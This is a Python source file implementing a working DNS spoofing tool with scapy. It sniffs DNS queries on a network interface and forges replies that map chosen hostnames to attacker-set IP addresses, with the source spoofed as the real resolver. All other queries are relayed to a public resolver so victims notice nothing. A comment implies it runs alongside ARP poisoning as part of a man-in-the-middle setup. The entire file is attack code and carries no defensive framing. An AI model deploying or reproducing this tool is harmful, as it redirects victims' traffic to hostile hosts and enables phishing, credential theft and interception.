from entities import Interface
from util import Sniffer, Dns
from scapy.all import DNS, IP, UDP, sr1, send, DNSRR, ICMP

class DNSAttack:
    def __init__(self,
            interface: Interface,
            dns_table: dict,
            dns_server: str = '8.8.8.8',
            request_timeout: int = 2,
            request_retries: int = 3):

        self.interface = interface
        self.dns_table = dns_table
        self.dns_server = dns_server
        self.request_timeout = request_timeout
        self.request_retries = request_retries
        self.active = False

    def start(self):
        self.active = True
        self.sniffing_thread = Sniffer(self.interface, self.process_packet)
        self.sniffing_thread.start()

    def stop(self):
        self.sniffing_thread.join()
        self.active = False

    def process_packet(self, packet):
        # we care only about DNS requests
        if not packet.haslayer(DNS) or not packet.haslayer(IP):
            return

        # ICMP containing DNS is probably just a destination unreachable message
        # we simply ignore those because it cannot be recovered from
        if packet.haslayer(ICMP):
            return

        # Skip requests from our machine
        if packet[IP].src == self.interface.ip_address:
            return

        # We will only handle standard queries
        if packet[DNS].qr != Dns.QUERY or packet[DNS].opcode != Dns.OPCODE_STANDARD_QUERY:
            return

        queried_host = packet[DNS].qd.qname[:-1].decode()

        if queried_host in self.dns_table:
            resolved_ip = self.dns_table[queried_host]

            dns_answer = DNSRR(rrname=queried_host + '.', ttl=330, type='A', rclass='IN', rdata=resolved_ip)

            dns_reply = IP() / UDP() / DNS()
            dns_reply[IP].src = packet[IP].dst
            dns_reply[IP].dst = packet[IP].src
            dns_reply[UDP].sport = packet[UDP].dport
            dns_reply[UDP].dport = packet[UDP].sport
            dns_reply[DNS].id = packet[DNS].id
            dns_reply[DNS].qr = Dns.RESPONSE
            dns_reply[DNS].aa = 0
            dns_reply[DNS].qd = packet[DNS].qd
            dns_reply[DNS].an = dns_answer
        else:
            response = self.perform_dns_request(packet[DNS])
            # If the request failed, we don't respond at all
            if response is None:
                return
            
            dns_reply = IP() / UDP() / response[DNS]
            dns_reply[IP].src = packet[IP].dst
            dns_reply[IP].dst = packet[IP].src
            dns_reply[UDP].sport = packet[UDP].dport
            dns_reply[UDP].dport = packet[UDP].sport

        send(dns_reply, verbose=0)

    def perform_dns_request(self, dns_layer):
        # We don't need an Ether layer because our arp cache is (presumably) not poisoned
        # or at least should not be
        request = IP() / UDP() / dns_layer
        request[IP].src = self.interface.ip_address
        request[IP].dst = self.dns_server
        request[UDP].dport = 53
        request[UDP].sport = 4500

        for _ in range(self.request_retries):
            response = sr1(request, verbose=0, timeout=self.request_timeout)
            if response is not None:
                return response

        return None
